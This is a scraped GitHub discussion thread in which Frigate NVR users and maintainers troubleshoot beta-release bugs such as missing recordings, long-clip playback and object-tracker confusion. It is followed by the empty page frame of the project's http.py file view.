[![@RexWheeler](https://avatars.githubusercontent.com/u/6587943?s=60&v=4)](/RexWheeler)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [RexWheeler](/RexWheeler) [Nov 1, 2023](#discussioncomment-7440897) Sponsor

 -

| On the other hand, being on 1.8.1 fixes an issue with go2rtc with grabbing a full frame jpg from certain cameras. Nice to *not* have to override the go2rtc version in beta3... |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@patdemko](https://avatars.githubusercontent.com/u/11141892?s=60&v=4)](/patdemko)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [patdemko](/patdemko) [Nov 1, 2023](#discussioncomment-7446371)

 -

| Just to follow up, manually configuring beta3 to use go2rtc 1.7.1 did fix my issue. Nice to have the flexibility to use any version of go2rtc! |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [RexWheeler](/RexWheeler) [Nov 1, 2023](#discussioncomment-7440926) Sponsor

 -

| When trying to watch a clip for an in progress long running event, I get a misleading error message. I think the issue is really that the clip is too long to view. I don't think this issue is new to Beta 3, I seem to recall having difficulty looking a long events in the past.  So the question is: Should long running (multiple hour) events be viewable?  If not, should the error message be more descriptive? (Like maybe "clip too large" or "not enough temp space" or whatever is the underlying issue that prevents long clips from playing.)  If long running events should be viewable, then I have an issue in my environment or there is a bug...  Here is what I see when I try. Nothing shows up in the logs when I try to view the event. [Screenshot 2023-10-31 174649](https://private-user-images.githubusercontent.com/6587943/279546155-415dd08e-82d2-4bc7-bf13-97ee7f919755.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii82NTg3OTQzLzI3OTU0NjE1NS00MTVkZDA4ZS04MmQyLTRiYzctYmYxMy05N2VlN2Y5MTk3NTUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OTE0N2UyYTk2ZjVkMzIyYmNiNGI2ZGNhOTM4NmZjMmU3ZTgyYWQzOTBlNTdkZmY5ZjAzZjdmZjg3MDFmNTgzNiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.Rvolv6AOSdMFietWBbb-RQ7ZorsgFq0zZAM2FJN-Ens) |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

2 replies

[![@RexWheeler](https://avatars.githubusercontent.com/u/6587943?s=60&v=4)](/RexWheeler)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [RexWheeler](/RexWheeler) [Nov 1, 2023](#discussioncomment-7440941) Sponsor

 -

| In my environment, I have the recording storage NFS mounted over the network, so it's not super fast, if that matters. Short clips play fine. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 1, 2023](#discussioncomment-7441012) Collaborator Author Sponsor

 -

| This is some what expected but a difficult issue to solve around the max number of segments |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [jvrobert](/jvrobert) [Nov 5, 2023](#discussioncomment-7477103)

 -

| Anyone test the auto tracking? Really cool that's being added. I've been hankering to buy the dahua 25x ptz with auto tracking, but if it works well in frigate I could get something smaller and cheaper. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

2 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 5, 2023](#discussioncomment-7477106) Collaborator Author Sponsor

 -

| The release notes have 2 different demo videos that are from the auto tracking feature in frigate. There are multiple people who have been testing it in the cameras channel of the HA discord. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@hawkeye217](https://avatars.githubusercontent.com/u/32435876?s=60&v=4)](/hawkeye217)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [hawkeye217](/hawkeye217) [Nov 5, 2023](#discussioncomment-7479239) Collaborator

 -

| You'll want to make sure you pick up a camera with robust ONVIF support if you decide on something other than the Dahua. Many camera manufacturers say their firmware fully supports ONVIF, but the implementation ends up beings subpar. Amcrest, Dahua, and Hikvision seem to be the best at it, according to user reports. But be sure to check out the [autotracking docs](https://deploy-preview-6262--frigate-docs.netlify.app/configuration/autotracking) and [growing list of supported cameras](https://deploy-preview-6262--frigate-docs.netlify.app/configuration/cameras/#onvif-ptz-camera-recommendations) before making a purchase. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [tpjanssen](/tpjanssen) [Nov 5, 2023](#discussioncomment-7479153)

 -

| [@NickM-27](https://github.com/NickM-27) [@blakeblackshear](https://github.com/blakeblackshear) On all of my camera's I'm missing the first 20 minutes or so of footage. Segments are still on the disk, Frigate doesn't play them. Also, all events that are within the first 20 minutes of that specific hour can't be played anymore.  Problem started on 11/03 on 15:00. All recordings before that date seem to be there. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

10 replies

Show 5 previous replies

[![@tpjanssen](https://avatars.githubusercontent.com/u/25168870?s=60&v=4)](/tpjanssen)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [tpjanssen](/tpjanssen) [Nov 5, 2023](#discussioncomment-7479587)

 -

| That still doesn't explain why the entries in de recordings table are missing? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 5, 2023](#discussioncomment-7479596) Collaborator Author Sponsor

 -

| Yes it does, 2023/... < 00.01.mp4 so that file wasn't included in the list so frigate thought it was deleted from the folder even though it wasn't, so it was removed from the DB |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@tpjanssen](https://avatars.githubusercontent.com/u/25168870?s=60&v=4)](/tpjanssen)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [tpjanssen](/tpjanssen) [Nov 5, 2023](#discussioncomment-7479906)

 -

| This problem should affect more people than just me I would say... |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 5, 2023](#discussioncomment-7479911) Collaborator Author Sponsor

 -

| Yes I see it too |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@tpjanssen](https://avatars.githubusercontent.com/u/25168870?s=60&v=4)](/tpjanssen)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [tpjanssen](/tpjanssen) [Nov 5, 2023](#discussioncomment-7479925)

 -

| I downgraded to beta 3 this morning, I assume beta 5 will be out soon? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [pyrodex](/pyrodex) [Nov 6, 2023](#discussioncomment-7488188)

 -

| Didn't see a beta4 thread but I am running beta4 and noticed something weird today with an on-going event related to a car.  I have my Driveway camera broken up into two zones:  ``` cameras:   driveway: # <------ Name the camera     record:       enabled: True       retain:         days: 90         mode: motion       events:         retain:           default: 90           mode: active_objects         required_zones:           - FrontYard     ui:       order: 1     birdseye:       order: 1     snapshots:       required_zones:           - FrontYard     ffmpeg:       output_args:         record: preset-record-generic-audio-copy       inputs:         - path: rtsp://127.0.0.1:8554/driveway # <--- the name here must match the name of the camera in restream           input_args: preset-rtsp-restream           roles:             - record         - path: rtsp://127.0.0.1:8554/driveway_sub # <--- the name here must match the name of the camera_sub in restream           input_args: preset-rtsp-restream           roles:             - detect     detect:       width: 1920       height: 1080       enabled: True       fps: 5     objects:       track:         - person         - bicycle         - dog         - face         - license_plate         - amazon         - fedex         - ups         - package         - car     motion:       mask:         - 1366,99,1374,28,1860,32,1862,97 # Timestamp from Camera         - 1422,0,1920,0,1920,298,1419,158,966,124,358,145,0,274,0,185,0,0 # Street view         - 1550,1080,1535,876,874,875,882,1080 # Rose bush     zones:        FrontYard:         coordinates: 1920,1080,1809,365,1655,231,1247,154,754,138,594,153,442,150,0,380,0,1080         objects:           - person           - car           - face           - package           - amazon           - fedex           - ups           - license_plate            - dog         filters:           car:             min_area: 55000       Street:         coordinates: 348,143,687,113,1144,107,1446,140,1735,223,1920,302,1920,0,529,0,0,0,0,306,183,227     live:       stream_name: driveway  ```  This morning as my wife was leaving her minivan triggered the car in the Front\_Yard zone as expected but for some reason the event went on much longer than expected.  I can see in the event snapshots shows the following:  [image](https://private-user-images.githubusercontent.com/108703/280739774-34af57be-213e-4d5b-862d-0bc105f80f27.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xMDg3MDMvMjgwNzM5Nzc0LTM0YWY1N2JlLTIxM2UtNGQ1Yi04NjJkLTBiYzEwNWY4MGYyNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMDI2MzlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xY2Y1MDhhMGNjOTQ4YTgwN2NiNDFhZGQyNjhkNDM5Y2YxZDVkMzc3Y2FiYzJjYjQxNDA2MWQ3NTU5NjE2ZDg4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BdkjtCbVmCYMVnhqIw10_qC7fT2Bi8nvGS8XqsECoEE)  Skipping other stuff...  Car enters the street according to Frigate:  [image](https://private-user-images.githubusercontent.com/108703/280739973-36218471-09ea-4335-adda-94f1e0daa774.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xMDg3MDMvMjgwNzM5OTczLTM2MjE4NDcxLTA5ZWEtNDMzNS1hZGRhLTk0ZjFlMGRhYTc3NC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMDI2MzlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02MWQyZDk2ZmFjMTk4ZjQ3NDI0Nzc1YTRkY2QxNDFiNTE4ODVhYTEyMTJlY2Y1YWE2MGQzZTkxMGU0M2E0ZDQ5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Sy4FtwK1V48WT3DuTeoWQO0LSEHJS_kTf2ur6aAzJCc)  Then the weirdness starts as you can see below it hops to a car in my neighbor's driveway in the Street zone and becomes stationary.  [image](https://private-user-images.githubusercontent.com/108703/280740166-fb936762-7ef0-4cd8-a26a-8af6e35e2d17.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xMDg3MDMvMjgwNzQwMTY2LWZiOTM2NzYyLTdlZjAtNGNkOC1hMjZhLThhZjZlMzVlMmQxNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMDI2MzlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lMjE3ZmY5YmVhNTRkYjdlZjgzNWU4NzljZmY3MDIwZGZhZmUzOTY2NWJmMmUwMGM5OTEyZWRlM2JmYzk0MmM0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.8wgkg7k8OAfbzli7-qw34dF_pyIpgAaPhE9-O9wIFus)  At this point Frigate is flopping between active and stationary all in the Street zone until finally this:  [image](https://private-user-images.githubusercontent.com/108703/280740476-db99f6d7-dc4e-406a-87b7-64360d80f920.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xMDg3MDMvMjgwNzQwNDc2LWRiOTlmNmQ3LWRjNGUtNDA2YS04N2I3LTY0MzYwZDgwZjkyMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMDI2MzlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yZWI2ZmZiZmQ2MzVhMDQ2ZTg4YWE5YjUyNGJiOTkwZmQ1YmJjMzM0NDVhYzYyZThhYzg1ZjU0OTUzODJlMTI1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.9YOHpC49ExvBrUgPkPQmONVb9PoC9n969PUUwSPKRto)  Overall, the event lasted for 29m and 7s and I've never seen this recently with my other car come and go from the garage onto the Front\_Yard zone. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

3 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 6, 2023](#discussioncomment-7488218) Collaborator Author Sponsor

 -

| the car drove by occluding the other car and the tracker became confused about which car was which. The new tracker is much smarter but cases where one object occludes another is very challenging. There are ways this can be improved in future versions of frigate |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@pyrodex](https://avatars.githubusercontent.com/u/108703?s=60&v=4)](/pyrodex)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [pyrodex](/pyrodex) [Nov 6, 2023](#discussioncomment-7488230)

 -

| Would doing a min\_size of a giant number in the Street zone for car help as a work around? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 6, 2023](#discussioncomment-7488247) Collaborator Author Sponsor

 -

| no that wouldn't help because the objects are still detected and tracked, whether or not the object is currently in a zone is irrelevant to the tracker |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [Nov 7, 2023](#discussioncomment-7495998) Sponsor

 -

| Hi:  I don't know if this a issue or something not implemented yet a [unraid user pointed me here](https://forums.unraid.net/topic/98064-support-blakeblackshear-frigate/?do=findComment&comment=1323679) that the `expire_interval: 1440` is not working. I monitored my beta 4 and is true, it is not working and my HDD array is spinning up every hour just to delete the oldest record segment.  Is there something missing? Are we doing something wrong?  I see also this opened [#2365](https://github.com/blakeblackshear/frigate/issues/2365)  Thanks |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

3 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 7, 2023](#discussioncomment-7498875) Collaborator Author Sponsor

 -

| I run the same 1440 time and I've not seen my array spinning up every hour, I think more information would be helpful to how the conclusion was drawn that it is frigate running and that the files are deleted every hour.  Also, would be good to see the config |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 7, 2023](#discussioncomment-7500201) Collaborator Author Sponsor

 -

| I added a log to the recordings cleanup and it is not running once an hour  ``` 2023-11-07 06:26:34.748235863  [2023-11-07 06:26:34] frigate.app                    INFO    : Starting Frigate (0.13.0-3589da5f) ... 2023-11-07 06:27:35.439062772  [2023-11-07 06:27:35] frigate.record.cleanup         INFO    : Running recording cleanup cycle  ```  time is now 08:15  it is important that you are setting the expire\_interval at the global level, setting it at the camera level does nothing |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@yayitazale](https://avatars.githubusercontent.com/u/6462849?s=60&v=4)](/yayitazale)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [yayitazale](/yayitazale) [Nov 7, 2023](#discussioncomment-7500223) Sponsor

 -

| Yes is see there is something else spinning up the array. Thanks |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [pyrodex](/pyrodex) [Nov 8, 2023](#discussioncomment-7505649)

 -

| I just came across the use\_experimental feature in the UI and love the "scrubbing" feature but noticed in the live view the audio isn't working. When I switch back to it being False it works as expected. Not sure if this is expected behavior but since it is use\_experimental I wanted to proceed with caution and awareness. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

2 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 8, 2023](#discussioncomment-7505655) Collaborator Author Sponsor

 -

| It only supports jsmpeg which doesn't support audio |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@pyrodex](https://avatars.githubusercontent.com/u/108703?s=60&v=4)](/pyrodex)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [pyrodex](/pyrodex) [Nov 8, 2023](#discussioncomment-7505660)

 -

| Thanks! That makes perfect sense. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [scooper1](/scooper1) [Nov 9, 2023](#discussioncomment-7526551)

 -

| it would be nice to have a beta 5 as beta 4 problem fixed hopefully |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

0 replies

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fdiscussions%2F8366)

Category

[💬

General](/blakeblackshear/frigate/discussions/categories/general)

Labels

None yet

22 participants

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=48&v=4)](/NickM-27) [![@pyrodex](https://avatars.githubusercontent.com/u/108703?s=48&v=4)](/pyrodex) [![@blakeblackshear](https://avatars.githubusercontent.com/u/569905?s=48&v=4)](/blakeblackshear) [![@bagobones](https://avatars.githubusercontent.com/u/1587701?s=48&v=4)](/bagobones) [![@jvrobert](https://avatars.githubusercontent.com/u/2155516?s=48&v=4)](/jvrobert) [![@ljmerza](https://avatars.githubusercontent.com/u/4085765?s=48&v=4)](/ljmerza) [![@yayitazale](https://avatars.githubusercontent.com/u/6462849?s=48&v=4)](/yayitazale) [![@RexWheeler](https://avatars.githubusercontent.com/u/6587943?s=48&v=4)](/RexWheeler) [![@aneisch](https://avatars.githubusercontent.com/u/6991461?s=48&v=4)](/aneisch) [![@Dvalin21](https://avatars.githubusercontent.com/u/7469013?s=48&v=4)](/Dvalin21) [![@patdemko](https://avatars.githubusercontent.com/u/11141892?s=48&v=4)](/patdemko) [![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=48&v=4)](/YBonline) [![@niyazFattahov](https://avatars.githubusercontent.com/u/13262691?s=48&v=4)](/niyazFattahov) [![@scooper1](https://avatars.githubusercontent.com/u/14822945?s=48&v=4)](/scooper1) [![@krzakx](https://avatars.githubusercontent.com/u/18627339?s=48&v=4)](/krzakx) [![@tpjanssen](https://avatars.githubusercontent.com/u/25168870?s=48&v=4)](/tpjanssen) [![@hawkeye217](https://avatars.githubusercontent.com/u/32435876?s=48&v=4)](/hawkeye217) [![@shred86](https://avatars.githubusercontent.com/u/32663154?s=48&v=4)](/shred86) [![@towerhand](https://avatars.githubusercontent.com/u/42445253?s=48&v=4)](/towerhand) [![@dz4news](https://avatars.githubusercontent.com/u/57462035?s=48&v=4)](/dz4news) [![@simondrake](https://avatars.githubusercontent.com/u/62928647?s=48&v=4)](/simondrake) and others

Heading

Bold

Italic

Quote

Code

Link

---

Numbered list

Unordered list

Task list

---

Attach files

Mention

Reference

Menu

* Heading
* Bold
* Italic
* Quote
* Code
* Link
* Numbered list
* Unordered list
* Task list
* Attach files
* Mention
* Reference

# Select a reply

 Loading

  [Create a new saved reply](/settings/replies?return_to=1)

 👍
1
  reacted with thumbs up emoji

 👎
1
  reacted with thumbs down emoji

 😄
1
  reacted with laugh emoji

 🎉
1
  reacted with hooray emoji

 😕
1
  reacted with confused emoji

 ❤️
1
  reacted with heart emoji

 🚀
1
  reacted with rocket emoji

 👀
1
  reacted with eyes emoji

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1c6afb77_20250114_202639.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F6aedc39a9a421cf48000a727f36b4c1495848a1d%2Ffrigate%2Fhttp.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F6aedc39a9a421cf48000a727f36b4c1495848a1d%2Ffrigate%2Fhttp.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

## Files

 6aedc39
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/6aedc39a9a421cf48000a727f36b4c1495848a1d)
2. /[frigate](/blakeblackshear/frigate/tree/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate)
/
# http.py

Copy path Blame  Blame
## Latest commit

## History

[History](/blakeblackshear/frigate/commits/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py)1775 lines (1477 loc) · 53.6 KB 6aedc39
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/6aedc39a9a421cf48000a727f36b4c1495848a1d)
2. /[frigate](/blakeblackshear/frigate/tree/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate)
/
# http.py

Top
## File metadata and controls

* Code
* Blame

